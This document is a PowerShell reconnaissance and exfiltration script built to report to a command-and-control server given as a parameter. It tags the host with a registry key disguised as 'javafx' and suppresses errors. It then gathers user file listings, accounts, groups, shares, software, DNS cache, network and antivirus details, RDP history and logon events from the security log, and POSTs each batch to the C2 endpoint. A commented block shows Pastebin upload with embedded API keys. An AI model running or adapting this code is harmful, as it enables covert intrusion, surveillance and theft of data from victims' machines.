#requires -version 2.0

[CmdLetBinding()]
param( 
	[string]$c2c 
	)

#=======================================================================================
# Recon
#=======================================================================================

function Invoke-Recon {

# Mask errors
$ErrorActionPreference= 'silentlycontinue'

#=======================================================================================
# Information Gathering
#=======================================================================================
# Create unique ID
$pc = [System.Guid]::NewGuid().ToString()
$command = "REG ADD HKCU\Software\javafx /v javafx /t REG_SZ /d $pc /f" 
[string] $CmdPath = "$env:windir\System32\cmd.exe"
[string] $CmdString = "$CmdPath" + " /C " + "$Command"
Invoke-Expression $CmdString

# Set environmental variables
$ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1] #
$computerName = (gi env:\Computername).Value #
$datebase = Get-Date -format D
$dateString = Get-Date -format MM-dd-yyyy
$date = Get-Date -Format MM/dd/yyyy-H:mm:ss
$domain = (Get-WmiObject win32_computersystem).Domain
$organisation = $domain
# Computer
$postParams = @{id=$pc;hostname=$computerName;ip=$ip;domain=$domain;org=$organisation;table='computer'}
Invoke-WebRequest -Uri "$c2c/link/add.php" -Method POST -Body $postParams

#organisation
$postParams = @{name=$organisation;table='organisation'}
Invoke-WebRequest -Uri "$c2c/link/add.php" -Method POST -Body $postParams

#$content = (gc "$Path" | out-string)
			#$postParams = @{api_dev_key='5052e0cedb40e0335e3f707bf8fce9c7';api_option='paste';api_paste_code=$content;api_paste_name='title-of-paste';api_paste_private='2';api_user_key='0eb2184947e88844a119c70253693b92'}
			#Invoke-WebRequest -Uri http://pastebin.com/api/api_post.php -Method POST -Body $postParams
	
#files
$file_xls = cmd.exe /c 'dir c:\users /w /s | findstr .xls'
$file_doc = cmd.exe /c 'dir c:\users /w /s | findstr .doc'
$file_ppt = cmd.exe /c 'dir c:\users /w /s | findstr .ppt'
$file_png = cmd.exe /c 'dir c:\users /w /s | findstr .png'
$file_jpg = cmd.exe /c 'dir c:\users /w /s | findstr .jpg'
$file_pdf= cmd.exe /c 'dir c:\users /w /s | findstr .pdf'
$file = "$file_xls $file_doc" # +"$file_ppt"+"$file_png"+"$file_jpg"+"$file_pdf"
$postParams = @{date=$date;content=$file;pc=$pc;table='files'}
Invoke-WebRequest -Uri "$c2c/link/add.php" -Method POST -Body $postParams

#users
$whoami = whoami
$whoami = "Who Am I: $whoami"
$user = (gi env:\USERNAME).value
$users = cmd.exe /c 'net user'
$userDirectory = (gi env:\userprofile).value
$user = "WHO AM I: $whoami `n USER: $user `n OTHERS: $users `n DIRECTORY: $userDirectory"
$postParams = @{date=$date;content=$user;pc=$pc;table='users'}
Invoke-WebRequest -Uri "$c2c/link/add.php" -Method POST -Body $postParams

#groups
$groupa = net localgroup
$groupb = Get-ADPrincipalGroupMembership $user | select name | out-string
$group = "$groupa `n $groupb"
$postParams = @{date=$date;content=$group;pc=$pc;table='groups'}
Invoke-WebRequest -Uri "$c2c/link/add.php" -Method POST -Body $postParams

#services
$service = net start 
$postParams = @{date=$date;content=$service;pc=$pc;table='services'}
Invoke-WebRequest -Uri "$c2c/link/add.php" -Method POST -Body $postParams

#shares
$shareused = net use 
$share = Get-SmbShare | out-string
$neighbor = cmd.exe /c 'net view'
$shares = "SHARE USED: $shareused `n SHARE LIST: $share `n SMB NEIGHBOR: $neighbor"
$postParams = @{date=$date;content=$shares;pc=$pc;table='shares'}
Invoke-WebRequest -Uri "$c2c/link/add.php" -Method POST -Body $postParams

#software
$application = Get-StartApps | out-string
$softwarea = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate| out-string
$software = "START APPS: $application `n SOFTWARE INSTALLED: $softwarea"
$postParams = @{date=$date;content=$software;pc=$pc;table='software'}
Invoke-WebRequest -Uri "$c2c/link/add.php" -Method POST -Body $postParams

#webhistory
$webhistory = ipconfig -displaydns| out-string
$postParams = @{date=$date;content=$webhistory;pc=$pc;table='webhistory'}
Invoke-WebRequest -Uri "$c2c/link/add.php" -Method POST -Body $postParams

#downloads
$downloads = dir C:\Users\*\Downloads\* -Recurse | Select Name, CreationTime, LastAccessTime, Attributes | out-string
$postParams = @{date=$date;content=$downloads;pc=$pc;table='downloads'}
Invoke-WebRequest -Uri "$c2c/link/add.php" -Method POST -Body $postParams

#network
$ipconfig = ipconfig -all
$myFQDN = (Get-WmiObject win32_computersystem).DNSHostName+"."+(Get-WmiObject win32_computersystem).Domain| out-string
$dns = Get-DnsClientServerAddress| out-string
$route = route print
$mac = getmac
$trace_publicIP = cmd.exe /c 'tracert 8.8.8.8'
$ip_all = "FQDN: $myFQDN `n IP CONFIG: $ipconfig `n DNS SERVER: $dns `n ROUTE TABLE: $route `n TRACE PUBLIC IP: $trace_publicIP"
$port = netstat -ant 
$listeningProcesses = netstat -ano | findstr -i listening | ForEach-Object { $_ -split "\s+|\t+" } | findstr /r "^[1-9+]*$" | sort | unique | ForEach-Object { Get-Process -Id $_ } | Select ProcessName,Path,Company,Description| out-string
$port_listen = "PORT:$port `n LISTENING: $listeningProcesses"
$arpa = arp -a
$arp = "MAC ADDRESS: $mac `n ARP TABLE: $arpa"
$postParams = @{ip_all=$ip_all;port_listen=$port_listen;arp=$arp;pc=$pc;table='network'}
Invoke-WebRequest -Uri "$c2c/link/add.php" -Method POST -Body $postParams

#security
$firewall0 = cmd.exe /c 'netsh firewall show state'
$firewall1 = cmd.exe /c 'netsh firewall show config'
$firewall = "$firewall0 `n $firewall1"
$antiVirus = Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct | out-string 
$postParams = @{antivirus=$antiVirus;firewall=$firewall;pc=$pc;table='security'}
Invoke-WebRequest -Uri "$c2c/link/add.php" -Method POST -Body $postParams

#system and disk
$winversion = [Environment]::OSVersion 
$language = Get-WinUserLanguageList| out-string
$usb = Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR\*\* | Select FriendlyName | out-string
$disk = Get-Volume| out-string
$task= tasklist /V
$vpn = Get-VpnConnection| out-string
$reg_hklm_run = Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | out-string 
$reg_hkcu_run = Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | out-string 
$syst_disk = "WIN VERSION: $winversion `n LANGUAGE: $language `n DISK: $disk `n USB USED: $usb `n VPN CONNEXION: $vpn `n REGISTRY HKLM: $reg_hklm_run `n REGISTRY HKCU: $reg_hkcu_run"
$postParams = @{date=$date;content=$syst_disk;pc=$pc;table='system_and_disk'}
Invoke-WebRequest -Uri "$c2c/link/add.php" -Method POST -Body $postParams

#loots
# Log and Registry 
    function Find-4648Logons {
        Param(
            $SecurityLog
        )
        $ExplicitLogons = $SecurityLog | Where {$_.InstanceID -eq 4648}
        $ReturnInfo = @{}
        foreach ($ExplicitLogon in $ExplicitLogons)
        {
            $Subject = $false
            $AccountWhosCredsUsed = $false
            $TargetServer = $false
            $SourceAccountName = ""
            $SourceAccountDomain = ""
            $TargetAccountName = ""
            $TargetAccountDomain = ""
            $TargetServer = ""
            foreach ($line in $ExplicitLogon.Message -split "\r\n")
            {
                if ($line -cmatch "^Subject:$")
                {
                    $Subject = $true
                }
                elseif ($line -cmatch "^Account\sWhose\sCredentials\sWere\sUsed:$")
                {
                    $Subject = $false
                    $AccountWhosCredsUsed = $true
                }
                elseif ($line -cmatch "^Target\sServer:")
                {
                    $AccountWhosCredsUsed = $false
                    $TargetServer = $true
                }
                elseif ($Subject -eq $true)
                {
                    if ($line -cmatch "\s+Account\sName:\s+(\S.*)")
                    {
                        $SourceAccountName = $Matches[1]
                    }
                    elseif ($line -cmatch "\s+Account\sDomain:\s+(\S.*)")
                    {
                        $SourceAccountDomain = $Matches[1]
                    }
                }
                elseif ($AccountWhosCredsUsed -eq $true)
                {
                    if ($line -cmatch "\s+Account\sName:\s+(\S.*)")
                    {
                        $TargetAccountName = $Matches[1]
                    }
                    elseif ($line -cmatch "\s+Account\sDomain:\s+(\S.*)")
                    {
                        $TargetAccountDomain = $Matches[1]
                    }
                }
                elseif ($TargetServer -eq $true)
                {
                    if ($line -cmatch "\s+Target\sServer\sName:\s+(\S.*)")
                    {
                        $TargetServer = $Matches[1]
                    }
                }
            }

            #Filter out logins that don't matter
            if (-not ($TargetAccountName -cmatch "^DWM-.*" -and $TargetAccountDomain -cmatch "^Window\sManager$"))
            {
                $Key = $SourceAccountName + $SourceAccountDomain + $TargetAccountName + $TargetAccountDomain + $TargetServer
                if (-not $ReturnInfo.ContainsKey($Key))
                {
                    $Properties = @{
                        LogType = 4648
                        LogSource = "Security"
                        SourceAccountName = $SourceAccountName
                        SourceDomainName = $SourceAccountDomain
                        TargetAccountName = $TargetAccountName
                        TargetDomainName = $TargetAccountDomain
                        TargetServer = $TargetServer
                        Count = 1
                        Times = @($ExplicitLogon.TimeGenerated)
                    }

                    $ResultObj = New-Object PSObject -Property $Properties
                    $ReturnInfo.Add($Key, $ResultObj)
                }
                else
                {
                    $ReturnInfo[$Key].Count++
                    $ReturnInfo[$Key].Times += ,$ExplicitLogon.TimeGenerated
                }
            }
        }

        return $ReturnInfo
    }
    function Find-4624Logons {
        Param (
            $SecurityLog
        )
        $Logons = $SecurityLog | Where {$_.InstanceID -eq 4624}
        $ReturnInfo = @{}
        foreach ($Logon in $Logons)
        {
            $SubjectSection = $false
            $NewLogonSection = $false
            $NetworkInformationSection = $false
            $AccountName = ""
            $AccountDomain = ""
            $LogonType = ""
            $NewLogonAccountName = ""
            $NewLogonAccountDomain = ""
            $WorkstationName = ""
            $SourceNetworkAddress = ""
            $SourcePort = ""

            foreach ($line in $Logon.Message -Split "\r\n")
            {
                if ($line -cmatch "^Subject:$")
                {
                    $SubjectSection = $true
                }
                elseif ($line -cmatch "^Logon\sType:\s+(\S.*)")
                {
                    $LogonType = $Matches[1]
                }
                elseif ($line -cmatch "^New\sLogon:$")
                {
                    $SubjectSection = $false
                    $NewLogonSection = $true
                }
                elseif ($line -cmatch "^Network\sInformation:$")
                {
                    $NewLogonSection = $false
                    $NetworkInformationSection = $true
                }
                elseif ($SubjectSection)
                {
                    if ($line -cmatch "^\s+Account\sName:\s+(\S.*)")
                    {
                        $AccountName = $Matches[1]
                    }
                    elseif ($line -cmatch "^\s+Account\sDomain:\s+(\S.*)")
                    {
                        $AccountDomain = $Matches[1]
                    }
                }
                elseif ($NewLogonSection)
                {
                    if ($line -cmatch "^\s+Account\sName:\s+(\S.*)")
                    {
                        $NewLogonAccountName = $Matches[1]
                    }
                    elseif ($line -cmatch "^\s+Account\sDomain:\s+(\S.*)")
                    {
                        $NewLogonAccountDomain = $Matches[1]
                    }
                }
                elseif ($NetworkInformationSection)
                {
                    if ($line -cmatch "^\s+Workstation\sName:\s+(\S.*)")
                    {
                        $WorkstationName = $Matches[1]
                    }
                    elseif ($line -cmatch "^\s+Source\sNetwork\sAddress:\s+(\S.*)")
                    {
                        $SourceNetworkAddress = $Matches[1]
                    }
                    elseif ($line -cmatch "^\s+Source\sPort:\s+(\S.*)")
                    {
                        $SourcePort = $Matches[1]
                    }
                }
            }

            #Filter out logins that don't matter
            if (-not ($NewLogonAccountDomain -cmatch "NT\sAUTHORITY" -or $NewLogonAccountDomain -cmatch "Window\sManager"))
            {
                $Key = $AccountName + $AccountDomain + $NewLogonAccountName + $NewLogonAccountDomain + $LogonType + $WorkstationName + $SourceNetworkAddress + $SourcePort
                if (-not $ReturnInfo.ContainsKey($Key))
                {
                    $Properties = @{
                        LogType = 4624
                        LogSource = "Security"
                        SourceAccountName = $AccountName
                        SourceDomainName = $AccountDomain
                        NewLogonAccountName = $NewLogonAccountName
                        NewLogonAccountDomain = $NewLogonAccountDomain
                        LogonType = $LogonType
                        WorkstationName = $WorkstationName
                        SourceNetworkAddress = $SourceNetworkAddress
                        SourcePort = $SourcePort
                        Count = 1
                        Times = @($Logon.TimeGenerated)
                    }

                    $ResultObj = New-Object PSObject -Property $Properties
                    $ReturnInfo.Add($Key, $ResultObj)
                }
                else
                {
                    $ReturnInfo[$Key].Count++
                    $ReturnInfo[$Key].Times += ,$Logon.TimeGenerated
                }
            }
        }

        return $ReturnInfo
    }
    Function Find-PSScriptsInPSAppLog {
        $ReturnInfo = @{}
        $Logs = Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -ErrorAction SilentlyContinue | Where {$_.Id -eq 4100}
        foreach ($Log in $Logs)
        {
            $ContainsScriptName = $false
            $LogDetails = $Log.Message -split "`r`n"

            $FoundScriptName = $false
            foreach($Line in $LogDetails)
            {
                if ($Line -imatch "^\s*Script\sName\s=\s(.+)")
                {
                    $ScriptName = $Matches[1]
                    $FoundScriptName = $true
                }
                elseif ($Line -imatch "^\s*User\s=\s(.*)")
                {
                    $User = $Matches[1]
                }
            }

            if ($FoundScriptName)
            {
                $Key = $ScriptName + "::::" + $User

                if (!$ReturnInfo.ContainsKey($Key))
                {
                    $Properties = @{
                        ScriptName = $ScriptName
                        UserName = $User
                        Count = 1
                        Times = @($Log.TimeCreated)
                    }

                    $Item = New-Object PSObject -Property $Properties
                    $ReturnInfo.Add($Key, $Item)
                }
                else
                {
                    $ReturnInfo[$Key].Count++
                    $ReturnInfo[$Key].Times += ,$Log.TimeCreated
                }
            }
        }

        return $ReturnInfo
    }
    Function Find-RDPClientConnections {
        $ReturnInfo = @{}
        New-PSDrive -Name HKU -PSProvider Registry -Root Registry::HKEY_USERS | Out-Null
        #Attempt to enumerate the servers for all users
        $Users = Get-ChildItem -Path "HKU:\"
        foreach ($UserSid in $Users.PSChildName)
        {
            $Servers = Get-ChildItem "HKU:\$($UserSid)\Software\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue

            foreach ($Server in $Servers)
            {
                $Server = $Server.PSChildName
                $UsernameHint = (Get-ItemProperty -Path "HKU:\$($UserSid)\Software\Microsoft\Terminal Server Client\Servers\$($Server)").UsernameHint
                    
                $Key = $UserSid + "::::" + $Server + "::::" + $UsernameHint

                if (!$ReturnInfo.ContainsKey($Key))
                {
                    $SIDObj = New-Object System.Security.Principal.SecurityIdentifier($UserSid)
                    $User = ($SIDObj.Translate([System.Security.Principal.NTAccount])).Value

                    $Properties = @{
                        CurrentUser = $User
                        Server = $Server
                        UsernameHint = $UsernameHint
                    }

                    $Item = New-Object PSObject -Property $Properties
                    $ReturnInfo.Add($Key, $Item)
                }
            }
        }

        return $ReturnInfo
    }
    $RDP = Find-RDPClientConnections | Format-List 
    $psscript = Find-PSScriptsInPSAppLog | Format-List
    $SecurityLog = Get-EventLog -LogName Security
    $4624 = Find-4624Logons $SecurityLog | Format-List 
    $4648 = Find-4648Logons $SecurityLog | Format-List 
	$loots = "RDP CONNEXION: $RDP `n SECURITY LOG 4624: $4624 `n SECURITY LOG 4648: $4648 `n PSHELL SCRIPT EXECUTED: $psscript"
	$postParams = @{date=$date;content=$loots;pc=$pc;table='loots'}
	Invoke-WebRequest -Uri "$c2c/link/add.php" -Method POST -Body $postParams
}

Invoke-Recon 

Exit 0